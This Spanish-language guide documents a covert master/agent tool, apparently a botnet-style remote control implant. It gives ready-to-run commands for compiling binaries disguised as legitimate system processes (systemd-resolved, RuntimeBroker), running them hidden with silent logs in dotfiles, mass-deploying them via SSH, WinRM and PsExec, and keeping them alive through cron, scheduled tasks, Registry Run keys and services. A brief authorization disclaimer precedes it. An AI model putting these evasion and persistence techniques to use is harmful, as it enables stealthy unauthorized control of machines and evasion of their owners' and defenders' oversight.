# Guía de Despliegue Sigiloso para Entornos Autorizados (Linux y Windows)

## ADVERTENCIA LEGAL
Este documento describe técnicas para ejecución sigilosa de servicios en entornos controlados donde tienes autorización explícita (pentesting autorizado, administración remota institucional, simulaciones de seguridad). **NO uses estas técnicas en sistemas sin autorización explícita.**

## Características de Ejecución Sigilosa

### 1. Modo Daemon/Hidden
**Linux:**
- Doble fork (patrón Unix daemon estándar)
- Desacoplamiento de terminal y sesión
- Sin entrada/salida visible en consola

**Windows:**
- Ocultación de ventana de consola
- Ejecución sin UI visible
- Puede instalarse como servicio de Windows

### 2. Nombre de Proceso Camuflado
**Linux:** Por defecto usa `systemd-resolved` (servicio legítimo)
**Windows:** Por defecto usa `RuntimeBroker` (proceso legítimo de Windows)

- Menos obvio en listados de `ps`/`tasklist`, `top`/`taskmgr`
- Personalizable con `--process-name`
- En Linux requiere biblioteca `setproctitle` para mejor efectividad

### 3. Logging Silencioso
- `--silent`: minimiza logs (solo errores críticos)
- `--logfile`: redirige a archivo oculto
- Sin `--logfile` en modo silent: todo va a `/dev/null` (Linux) o `nul` (Windows)

### 4. Compilación a Binario
- PyInstaller genera ejecutable standalone
- No requiere Python instalado en el sistema objetivo
- Elimina rastros de `.py` en procesos

## Compilación

### Linux: Instalar dependencias
```bash
pip3 install --user -r requirements.txt
```

### Linux: Compilar a binario
```bash
./build.sh
```
Genera: `dist/systemd-resolved`

### Linux: Compilación manual avanzada
```bash
pyinstaller --onefile \
    --name systemd-resolved \
    --strip \
    --clean \
    servant.py
```

### Windows: Instalar dependencias
```cmd
pip install -r requirements.txt
```

### Windows: Compilar a binario
```cmd
build_windows.bat
```
Genera: `dist\RuntimeBroker.exe`

### Windows: Compilación manual avanzada
```cmd
pyinstaller --onefile --noconsole --name RuntimeBroker --strip --clean servant.py
```

**Nota:** `--noconsole` es crucial en Windows para que no aparezca ventana de consola.

## Ejecución en Modo Sigiloso

### Linux: Daemon silencioso
```bash
./dist/systemd-resolved \
    --daemon \
    --silent \
    --token my-secret-token \
    --pidfile /var/tmp/.srv.pid \
    --logfile /var/tmp/.srv.log \
    --master-host 192.168.1.100 \
    --master-port 65433
```

### Windows: Ventana oculta y silencioso
```cmd
RuntimeBroker.exe --hide-window --silent --token my-secret-token --pidfile C:\Windows\Temp\.srv.pid --logfile C:\Windows\Temp\.srv.log --master-host 192.168.1.100 --master-port 65433
```

O con PowerShell (completamente oculto):
```powershell
$startInfo = New-Object System.Diagnostics.ProcessStartInfo
$startInfo.FileName = "C:\Windows\Temp\RuntimeBroker.exe"
$startInfo.Arguments = "--hide-window --silent --token my-secret-token --master-host 192.168.1.100 --master-port 65433"
$startInfo.WindowStyle = 'Hidden'
$startInfo.CreateNoWindow = $true
[System.Diagnostics.Process]::Start($startInfo)
```

### Opciones disponibles (ambos OS):
- `--daemon`: Fork y ejecuta en background (Linux only)
- `--hide-window`: Oculta ventana de consola (Windows only)
- `--silent`: Logging mínimo (solo errores críticos)
- `--logfile PATH`: Archivo de log
- `--pidfile PATH`: Archivo con PID del proceso
- `--process-name NAME`: Nombre a mostrar en gestor de procesos
- `--host IP`: IP donde escucha (default: 127.0.0.1)
- `--port PORT`: Puerto TCP (default: 65432)
- `--token TOKEN`: Token de autenticación
- `--master-host IP`: IP del master para anunciarse
- `--master-port PORT`: Puerto UDP del master

### Linux: Despliegue remoto vía SSH
```bash
# Copiar binario al host remoto
scp dist/systemd-resolved user@192.168.1.50:/tmp/systemd-resolved

# Ejecutar remotamente en modo daemon
ssh user@192.168.1.50 << 'EOF'
chmod +x /tmp/systemd-resolved
/tmp/systemd-resolved \
    --daemon \
    --silent \
    --token my-token \
    --pidfile /var/tmp/.srv.pid \
    --process-name systemd-resolved \
    --master-host 192.168.1.100 \
    --master-port 65433 &
EOF
```

### Windows: Despliegue remoto con script
```cmd
REM Usando el script incluido
deploy_windows.bat
```

### Windows: Despliegue remoto con Python (WinRM)
```bash
# Instalar pywinrm
pip install pywinrm

# Desplegar en un host
python deploy_windows_remote.py \
    --host 192.168.1.50 \
    --user Administrator \
    --password Pass123 \
    --token my-secret-token \
    --master-ip 192.168.1.100 \
    --master-port 65433

# Desplegar en múltiples hosts desde archivo
python deploy_windows_remote.py \
    --hosts hosts.txt \
    --user Administrator \
    --password Pass123 \
    --token my-secret-token \
    --master-ip 192.168.1.100
```

### Windows: Despliegue con PsExec (requiere Sysinternals)
```cmd
REM Copiar binario
copy dist\RuntimeBroker.exe \\192.168.1.50\C$\Windows\Temp\

REM Ejecutar remotamente
psexec \\192.168.1.50 -d -s C:\Windows\Temp\RuntimeBroker.exe --hide-window --silent --token my-token --master-host 192.168.1.100 --master-port 65433
```

### Windows: Instalar como servicio de Windows
```cmd
REM Instalar servicio (requiere permisos de administrador)
python install_windows_service.py install

REM Iniciar servicio
net start ServantService

REM Verificar estado
sc query ServantService

REM Detener servicio
net stop ServantService

REM Desinstalar servicio
python install_windows_service.py remove
```

**Nota:** Edita `install_windows_service.py` para configurar token, master host/port antes de instalar.

## Gestión del Servant

### Linux: Verificar si está ejecutándose
```bash
# Por PID file
cat /var/tmp/.srv.pid

# Buscar proceso
ps aux | grep systemd-resolved

# Verificar puerto
netstat -tuln | grep 65432
# o
ss -tuln | grep 65432
```

### Linux: Detener el servant
```bash
# Usando PID file
kill $(cat /var/tmp/.srv.pid)

# Forzar si es necesario
kill -9 $(cat /var/tmp/.srv.pid)

# Buscar y matar por puerto
kill $(lsof -t -i:65432)
```

### Linux: Ver logs
```bash
tail -f /var/tmp/.srv.log
```

### Windows: Verificar si está ejecutándose
```cmd
REM Por PID file
type C:\Windows\Temp\.srv.pid

REM Buscar proceso
tasklist | findstr RuntimeBroker

REM Verificar puerto
netstat -ano | findstr :65432
```

### Windows: Detener el servant
```cmd
REM Usando PID file
for /f %i in (C:\Windows\Temp\.srv.pid) do taskkill /PID %i /F

REM Por nombre de proceso
taskkill /IM RuntimeBroker.exe /F

REM Por puerto (requiere encontrar PID primero)
for /f "tokens=5" %a in ('netstat -ano ^| findstr :65432') do taskkill /PID %a /F
```

### Windows: Ver logs
```cmd
type C:\Windows\Temp\.srv.log

REM O seguir en tiempo real con PowerShell
Get-Content C:\Windows\Temp\.srv.log -Wait -Tail 20
```

## Uso del Master

### Iniciar servidor de registro:
```bash
python3 master.py serve \
    --listen-host 0.0.0.0 \
    --listen-port 65433 \
    --registry-file /tmp/servants_registry.json
```

### Listar servants conectados:
```bash
python3 master.py list
```

### Enviar comando a un servant específico:
```bash
# Por IP registrada
python3 master.py send \
    --ip 192.168.1.50 \
    --token my-token \
    --action run \
    --count 100

# Por host:puerto directo
python3 master.py send \
    --host 192.168.1.50 \
    --port 65432 \
    --token my-token \
    --action run \
    --count 100
```

### Enviar comando a TODOS los servants:
```bash
python3 master.py send-all \
    --token my-token \
    --action run \
    --count 100
```

## Técnicas Adicionales de Reducción de Visibilidad

### 1. Ubicaciones de archivos menos obvias:
```bash
# Binario
/usr/local/bin/systemd-resolved
/opt/.hidden/srv
~/.local/bin/update-checker

# Logs
/var/tmp/.srv.log
~/.cache/.syslog
/tmp/.proc.log

# PID files
/var/tmp/.srv.pid
~/.cache/.pid
```

### 2. Nombres de proceso alternativos:
```bash
--process-name systemd-resolved
--process-name networkd-dispatcher
--process-name update-notifier
--process-name dbus-daemon
--process-name python3  # Si quieres que parezca Python genérico
```

### 3. Puerto menos obvio:
```bash
--port 53    # DNS (requiere root/admin)
--port 80    # HTTP (requiere root/admin)
--port 443   # HTTPS (requiere root/admin)
--port 3306  # MySQL
--port 5432  # PostgreSQL
--port 8080  # HTTP alternativo
```

### 4. Ejecución con baja prioridad (menos impacto)

**Linux:**
```bash
nice -n 19 ./systemd-resolved --daemon --silent ...
```

**Windows (PowerShell como admin):**
```powershell
$process = Start-Process -FilePath "RuntimeBroker.exe" -ArgumentList "--hide-window --silent --token TOKEN" -PassThru
$process.PriorityClass = 'BelowNormal'
```

### 5. Persistencia (reinicio automático)

**Linux - Cron job:**
```bash
# Editar crontab
crontab -e

# Añadir línea (verifica cada 5 minutos y reinicia si no está):
*/5 * * * * pgrep -f systemd-resolved > /dev/null || /usr/local/bin/systemd-resolved --daemon --silent --token TOKEN --pidfile /var/tmp/.srv.pid --master-host MASTER_IP --master-port 65433
```

**Windows - Tarea programada:**
```cmd
REM Crear tarea que ejecute al inicio y cada hora
schtasks /create /tn "RuntimeBroker" /tr "C:\Windows\Temp\RuntimeBroker.exe --hide-window --silent --token TOKEN --master-host MASTER_IP --master-port 65433" /sc onstart /ru SYSTEM

REM Verificar tarea
schtasks /query /tn "RuntimeBroker"

REM Eliminar tarea
schtasks /delete /tn "RuntimeBroker" /f
```

**Windows - Registry Run key (ejecuta al login):**
```cmd
REM Añadir a HKLM (todas las sesiones, requiere admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v RuntimeBroker /t REG_SZ /d "C:\Windows\Temp\RuntimeBroker.exe --hide-window --silent --token TOKEN" /f

REM O solo para usuario actual
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RuntimeBroker /t REG_SZ /d "C:\Windows\Temp\RuntimeBroker.exe --hide-window --silent --token TOKEN" /f

REM Eliminar
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v RuntimeBroker /f
```

**Windows - Servicio (más persistente y difícil de detectar):**
```cmd
python install_windows_service.py install
sc config ServantService start= auto
```

## Implementación de bodrio()

Recuerda implementar la función `bodrio(index)` en `servant.py`:

```python
def bodrio(index: int) -> None:
    """Implementa aquí tu lógica.
    
    Ejemplo: escaneo de puertos, procesamiento de datos, etc.
    """
    import time
    # Tu lógica aquí
    print(f"Thread {index} ejecutando tarea...")
    time.sleep(1)  # Placeholder
```

## Limpieza y Desinstalación

### Linux: Detener y eliminar del host remoto
```bash
ssh user@192.168.1.50 << 'EOF'
# Matar proceso
kill $(cat /var/tmp/.srv.pid 2>/dev/null) 2>/dev/null || true
kill -9 $(lsof -t -i:65432) 2>/dev/null || true

# Eliminar archivos
rm -f /tmp/systemd-resolved
rm -f /usr/local/bin/systemd-resolved
rm -f /var/tmp/.srv.pid
rm -f /var/tmp/.srv.log

# Limpiar crontab si se añadió
crontab -l | grep -v systemd-resolved | crontab -
EOF
```

### Windows: Detener y eliminar
```cmd
REM Matar proceso
taskkill /IM RuntimeBroker.exe /F 2>nul

REM Eliminar archivos
del /F /Q C:\Windows\Temp\RuntimeBroker.exe
del /F /Q C:\Windows\Temp\.srv.pid
del /F /Q C:\Windows\Temp\.srv.log

REM Eliminar tarea programada si existe
schtasks /delete /tn "RuntimeBroker" /f 2>nul

REM Eliminar registry run key si existe
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v RuntimeBroker /f 2>nul
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RuntimeBroker /f 2>nul

REM Detener y desinstalar servicio si existe
net stop ServantService 2>nul
python install_windows_service.py remove
```

### Windows: Limpieza remota con PowerShell
```powershell
Invoke-Command -ComputerName 192.168.1.50 -Credential (Get-Credential) -ScriptBlock {
    Stop-Process -Name RuntimeBroker -Force -ErrorAction SilentlyContinue
    Remove-Item -Path C:\Windows\Temp\RuntimeBroker.exe -Force -ErrorAction SilentlyContinue
    Remove-Item -Path C:\Windows\Temp\.srv.* -Force -ErrorAction SilentlyContinue
    schtasks /delete /tn "RuntimeBroker" /f 2>$null
}
```

## Notas de Seguridad

1. **Autorización**: SIEMPRE obtén autorización por escrito antes de desplegar
2. **Documentación**: Mantén registro de dónde y cuándo desplegaste servants
3. **Limpieza**: Elimina servants cuando termines la operación autorizada
4. **Monitoreo**: Supervisa el uso de recursos para no impactar producción
5. **Tokens fuertes**: Usa tokens largos y aleatorios (>32 caracteres)
6. **Red segura**: Usa VPN o túneles SSH para comunicación master-servant
7. **Cifrado**: Considera TLS si la red no es confiable

## Ejemplo Completo de Despliegue

```bash
#!/bin/bash
# deploy_servants.sh - Despliega servants en múltiples hosts

MASTER_IP="192.168.1.100"
MASTER_PORT="65433"
TOKEN="tu-token-super-secreto-aqui"
BINARY="dist/systemd-resolved"

HOSTS=(
    "192.168.1.50"
    "192.168.1.51"
    "192.168.1.52"
)

for host in "${HOSTS[@]}"; do
    echo "Desplegando en $host..."
    
    # Copiar binario
    scp "$BINARY" "user@$host:/tmp/srv"
    
    # Ejecutar
    ssh "user@$host" << EOF
chmod +x /tmp/srv
/tmp/srv \
    --daemon \
    --silent \
    --token $TOKEN \
    --pidfile /var/tmp/.srv.pid \
    --process-name systemd-resolved \
    --master-host $MASTER_IP \
    --master-port $MASTER_PORT
EOF
    
    echo "✓ Desplegado en $host"
done

echo ""
echo "Esperando anuncios..."
sleep 5

echo ""
echo "Servants registrados:"
python3 master.py list
```

## Troubleshooting

### Servant no aparece en registry:
- **Firewall:** Verifica que UDP 65433 esté abierto
  - Linux: `sudo ufw allow 65433/udp` o `sudo firewall-cmd --add-port=65433/udp`
  - Windows: `netsh advfirewall firewall add rule name="Servant UDP" dir=in action=allow protocol=UDP localport=65433`
- Verifica que master serve esté ejecutándose
- Revisa logs

### No se puede conectar al servant:
- **Firewall:** Verifica que TCP 65432 esté abierto
  - Linux: `sudo ufw allow 65432/tcp`
  - Windows: `netsh advfirewall firewall add rule name="Servant TCP" dir=in action=allow protocol=TCP localport=65432`
- Verifica token correcto
- Prueba conexión:
  - Linux: `telnet host 65432` o `nc -zv host 65432`
  - Windows: `Test-NetConnection -ComputerName host -Port 65432`

### Proceso visible en gestor de tareas:
- **Linux:** Instala setproctitle: `pip3 install setproctitle` y recompila
- **Windows:** Asegúrate de compilar con `--noconsole` y usar `--hide-window`

### Alto uso de CPU:
- Implementa delays/sleeps en bodrio()
- Reduce threads con `--count`
- Baja prioridad:
  - Linux: `nice -n 19 ...`
  - Windows: Cambia prioridad del proceso en Task Manager o con PowerShell

### Windows: Ventana de consola sigue visible:
- Compila con PyInstaller usando `--noconsole --windowed`
- Ejecuta con `--hide-window`
- O usa PowerShell con `WindowStyle = 'Hidden'`

### Windows: "Access Denied" al instalar servicio:
- Ejecuta PowerShell/CMD como Administrador
- Verifica permisos del usuario

### Windows: WinRM no funciona para despliegue remoto:
- Habilita WinRM en host remoto: `winrm quickconfig`
- Configura autenticación: `winrm set winrm/config/service/auth @{Basic="true"}`
- Verifica firewall: puerto 5985 (HTTP) o 5986 (HTTPS)

### Linux: "fork failed: Resource temporarily unavailable":
- Demasiados procesos. Verifica límites: `ulimit -u`
- Aumenta límite: `ulimit -u 4096`

### Servant se cierra después de cerrar SSH/terminal:
- **Linux:** Usa `--daemon` o `nohup` y asegúrate de desacoplar del terminal
- **Windows:** No debería pasar con `--hide-window`, pero usa servicio para mayor persistencia
